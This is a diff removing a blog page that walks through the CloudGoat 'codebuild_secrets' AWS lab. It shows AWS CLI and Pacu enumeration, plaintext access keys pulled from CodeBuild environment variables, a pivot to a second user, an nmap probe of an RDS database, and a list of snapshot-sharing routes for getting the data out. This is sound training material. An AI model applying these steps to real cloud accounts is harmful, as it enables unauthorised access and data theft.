@@ -1,534 +1,181 @@
-<!doctype html><html lang=en>
-<head>
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-133811886-2')</script>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta http-equiv=x-ua-compatible content="IE=edge">
-<script src=/js/nav.js></script>
-<link rel="shortcut icon" href=/favicon.ico>
-<link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous>
-<link rel=stylesheet href=/css/main.css>
-<title>
-codebuild_secrets | jellyparks
-</title>
-</head>
-<body>
-<header>
-</header>
-<div class=site-wrapper>
-<div class="sticky top-bar">
-<div id=mySidenav class=sidenav include-nav=/nav.html>
-</div>
-<span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span>
-</div>
-<div class=container>
-<div class=blog-header>
-<h1>codebuild_secrets</h1>
-</div>
-<div class=row>
-<div class="col-sm-8 blog-main">
-<div class=blog-post>
-<hr>
-<p>According to the official documentation for this scenario (<a href=https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/codebuild_secrets>here</a>) the overall goal is &ldquo;a pair of secret strings that are stored in a secure RDS database.&rdquo;</p>
-<p>Once the scenario creation process completes we are presented with a set of access keys for the user account &lsquo;solo&rsquo;.</p>
-<hr>
-<h3 id=who-are-we>Who are we?</h3>
-<p>First lets make sure the credentials we have obtained are valid. We can do this with the following command:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile solo sts get-caller-identity
-</code></pre></td></tr></table>
-</div>
-</div><p>we get the following successful response:</p>
-<p><img src=images/initial-user.png alt="Initial User" class=img-fluid></p>
-<hr>
-<h3 id=what-can-we-do>What can we do?</h3>
-<p>Instead of heading to Pacu and using its handy enumeration lets do something that is a bit lighter on the logs and just poke around a bit. Perhaps we have access to make s3 calls, lets run <code>s3 ls</code> and see what happens.</p>
-<p><img src=images/s3-ls.png alt=s3-ls class=img-fluid></p>
-<p>Interesting, it does seem like we can see a bucket in s3. Perhaps we can dig deeper and this bucket has something useful in it. After all, judging by its name it probably has some sort of logs and probably other things and stuff in it. We can do this by running:</p>
-<pre tabindex=0><code>aws --profile solo s3 ls logaboutlogsthingsandstuff34343434
-</code></pre><p><img src=images/logsaboutstuff.png alt=logsaboutstuff class=img-fluid></p>
-<p>Unfortunatly it looks like it errors out with a permission denied error. Lets continue on our path of manual enumeration. This time we will branch over into ec2&rsquo;s. Why ec2&rsquo;s, and why did we try s3 first? No real reason, other than to hit services that are fairly common, and that a vast majority of identities have access to.</p>
-<p>To enumerate the ec2&rsquo;s we will use the describe call:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile solo ec2 describe-instances |jq <span style=color:#0c6>&#39;.Reservations[].Instances[] | {InstanceId,PublicDnsName,PublicIpAddress,SubnetId,SecurityGroups,IamInstanceProfile}&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>This produces the output below, showing us an active ec2 with a public ip address.</p>
-<p><img src=images/ec2-enum.png alt=ec2_enum class=img-fluid></p>
-<p>Interesting, lets see if we can dig a bit deeper into the security group that is attached with the name: <code>cg-ec2-ssh-cgidg25jfhzv9a</code>. Chances are that it only allows ssh since its in the name, but who knows a lazy admin could have added other ports to the security group for quick access. We can get the security group details with:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile solo ec2 describe-security-groups --group-ids sg-09f30e4f217cd294a --region us-east-1 | jq <span style=color:#0c6>&#39;.SecurityGroups[] | .IpPermissions[]&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>As expected, the only port allowed with this security gorup is <code>TCP/22</code>.</p>
-<p><img src=images/ec2-sec.png alt=ec2_sec class=img-fluid></p>
-<hr>
-<h3 id=additional-service-enumeration>Additional Service Enumeration</h3>
-<p>We now know we cannot see anything useful in S3 and there is not much to do with the Ec2. We could pivot and attempt to log into the SSH. That however, is beyond the scope of this assessment. The great thing about AWS is there are several other services we can enumerate. These keys we have were created for a reason. Up to this point we really have not discovered that reason. MORE enumeration!</p>
-<p>For this next part we will switch over to Pacu and let it handle some of the additional enumeration for us. There are several services that are not included in Pacu that these keys could be used for, but sometimes its nice to let tools live up to there purpose. Looking at the picture below we can see Pacu has several options within the ENUM category:</p>
-<p><img src=images/pacu-enum-options.png alt=pacu_enum_options class=img-fluid></p>
-<p>Some of these we have lightly touched. Perhaps we have rights to Lambda? Lets see what happens if we try the <code>lambda__enum</code>.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>run lambda__enum --region us-east-1
-</code></pre></td></tr></table>
-</div>
-</div><p>*<em>Note: In the command above I specify the us-east-1 region, this is because I know us-east-1 is only region in my account where workloads are being placed. If you do not know where the workloads exist, you will have to enumerate each region.</em></p>
-<p><img src=images/lambda-enum.png alt=lambda_enum class=img-fluid></p>
-<p>Once again, brick wall. We are missing the required permissions. All of the other service enumerations return the same results except for one, codebuild.</p>
-<hr>
-<h3 id=codebuild-enum>Codebuild Enum</h3>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>run codebuild__enum
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/codebuild-enum.png alt=codebuild_enum class=img-fluid></p>
-<p>Success! The codebuild enumeration found 1 project and 2 environment variables. Neat! In Pacu we can run the <code>data</code> command to see the information it pulled from our enumeration efforts. Below is a snippet of the data:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=color:#fff;background-color:#c00>Pacu</span> <span style=color:#fff;background-color:#c00>(code_build:solo)</span> <span style=color:#fff;background-color:#c00>&gt;</span> <span style=color:#fff;background-color:#c00>data</span>
-
-<span style=color:#fff;background-color:#c00>CodeBuild:</span> {
- <span style=color:#2c5dcd;font-weight:700>&#34;EnvironmentVariables&#34;</span>: [
-  {
-   <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-access-key&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;AKIA5X73KRQWNCPL&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
-  },
-  {
-   <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-secret-key&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;nG3Wtl86vXcDp90JUx9smFriCoFk0&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
-  }
- ],
- <span style=color:#2c5dcd;font-weight:700>&#34;Projects&#34;</span>: [
- {
-  <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;cg-codebuild-cgidg25jfhzv9a&#34;</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;arn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:codebuild:us-east-1:1111111111111:project/cg-codebuild-cgidg25jfhzv9a&#34;</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;source&#34;</span>: {
-   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;NO_SOURCE&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;buildspec&#34;</span>: <span style=color:#0c6>&#34;version: 0.2\n\nphases:\n pre_build:\n commands:\n - echo \&#34;This is CloudGoat&#39;s simpliest buildspec file ever (maybe)\&#34;&#34;</span>
-   },
-   <span style=color:#2c5dcd;font-weight:700>&#34;artifacts&#34;</span>: {
-    <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;NO_ARTIFACTS&#34;</span>
-    },
-   <span style=color:#2c5dcd;font-weight:700>&#34;cache&#34;</span>: {
-    <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;NO_CACHE&#34;</span>
-  },
-  <span style=color:#2c5dcd;font-weight:700>&#34;environment&#34;</span>: {
-   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;LINUX_CONTAINER&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;image&#34;</span>: <span style=color:#0c6>&#34;aws/codebuild/standard:1.0&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;computeType&#34;</span>: <span style=color:#0c6>&#34;BUILD_GENERAL1_SMALL&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;environmentVariables&#34;</span>: [
-   {
-    <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-access-key&#34;</span>,
-    <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;AKIA5X73KRQWNCPL&#34;</span>,
-    <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
-   },
-   {
-    <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-secret-key&#34;</span>,
-    <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;nG3Wtl86vXcDp90JUx9smFriCoFk0&#34;</span>,
-    <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
-   }
-  ]
- },
-</code></pre></td></tr></table>
-</div>
-</div><p>Looking at the output we have a container image, and in the build it sets a couple of environment variables:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>  {
-   <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-access-key&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;AKIA5X73KRQWNCPL&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
-  }<span style=color:#fff;background-color:#c00>,</span>
-  {
-   <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;calrissian-aws-secret-key&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#0c6>&#34;nG3Wtl86vXcDp90JUx9smFriCoFk0&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;type&#34;</span>: <span style=color:#0c6>&#34;PLAINTEXT&#34;</span>
-  }
-</code></pre></td></tr></table>
-</div>
-</div><p>Awesome, we have another set of keys. These keys seem to be for a user name Calrissian. It seems like this organization has a fondness for Star Trek.</p>
-<hr>
-<h3 id=codebuild-manual-enumeration>Codebuild Manual Enumeration</h3>
-<p>Before we dig into the Calrissian user, lets take a step back and re run this codebuild enumeration using the aws cli. We start buy querying aws for a list of every project.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile solo codebuild list-projects
-</code></pre></td></tr></table>
-</div>
-</div><p>This produces the name of the project <code>cg-codebuild-cgidg25jfhzv9a</code></p>
-<p><img src=images/codebuild-projects.png alt=codebuild_projects class=img-fluid></p>
-<p>Now that we have the project name we can query aws for the details about the project with:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a
-</code></pre></td></tr></table>
-</div>
-</div><p>This dumps all of the details about the project. Cleaning the request up a little bit with jq:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a |jq <span style=color:#0c6>&#39;.projects[].environment.environmentVariables[]&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>We get the clean output below.</p>
-<p><img src=images/codebuild-creds.png alt=codebuild_creds class=img-fluid></p>
-<hr>
-<h3 id=calrissian>Calrissian</h3>
-<p>It&rsquo;s time to find out what permissions we have as the Calrissian user. First we will make sure the credentials work by running <code>get-caller-identity</code>.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal sts get-caller-identity
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/cal-whoami.png alt=cal_whoami class=img-fluid></p>
-<p>We have confirmed the credentials are still valid. Now we need to start the enumeration process over again. We can start just like last time and see if we have access to s3.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal s3 ls
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/cal-s3.png alt=cal_s3 class=img-fluid></p>
-<p>Unfortunatly, just like the solo user we do not have access to s3. In fact judging by this error we have even less permission to s3 now than we did with solo. Solo had a policy action to describe-buckets, and we do not.</p>
-<p>Attempting to describe instances returns a similar error that we are unauthorized.</p>
-<p><img src=images/cal-ec2.png alt=cal_ec2 class=img-fluid></p>
-<p>After lots of additional enumeration (and remembering the goal is to access an RDS database) we finally come across an area of aws where we have permissions, RDS. We can determine this and learn details about the environment with the following command:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal rds describe-db-instances |jq <span style=color:#0c6>&#39;.DBInstances[]&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>All kinds of useful information is returned as we can see in the screenshot below:</p>
-<p><img src=images/cal-rds.png alt=cal_rds class=img-fluid></p>
-<p>From the details in the screenshot we can determine the type of database, its DNS name, port its listening on, the security group it is a part of, and subnet information.</p>
-<ul>
-<li>Instance Identifer: cg-rds-instance-cgidg25jfhzv9a</li>
-<li>Engine: postgres</li>
-<li>Endpoint: cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com</li>
-<li>Port: 5432</li>
-<li>Security Group: sg-096bb9f39aaa9334d</li>
-<li>Subnets: subnet-029ccc8e6ee777916, subnet-054c36278fc5a0b5c</li>
-</ul>
-<p>Lets see if we can connect. We still do not have a password, but if we can connect, we can try and work around that. We know the database is a postgres server so we can use the following command to attempt a connection:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>psql -h cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p <span style=color:#5918bb;font-weight:700>5432</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>That does not seem to work, it just hangs for a couple of minutes, the psql app is probably trying to connect/reconnect before timing out. Lets confirm that the RDS instance is listening on 5432 and that we have access to it. We can do this with:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nmap -Pn -p5432 cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com
-</code></pre></td></tr></table>
-</div>
-</div><p>Looking at the nmap output, it appears that the RDS instance is not configured in a way that we have access to it.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>5432/tcp filtered postgresql
-</code></pre></td></tr></table>
-</div>
-</div><p>At this point we know we have access to make RDS calls. We do not know what our limits are but perhaps we have additional rights. There are a few different paths we could take at this point:</p>
-<ol>
-<li>We can attempt to take our DB public with modify-db-subnet-group, and then attempt to modify the instance to set a password</li>
-<li>We can attempt to take a snapshot and then share the snapshot with an account we control</li>
-<li>We can attempt to snapshot the instance, and create a public version that we control</li>
-</ol>
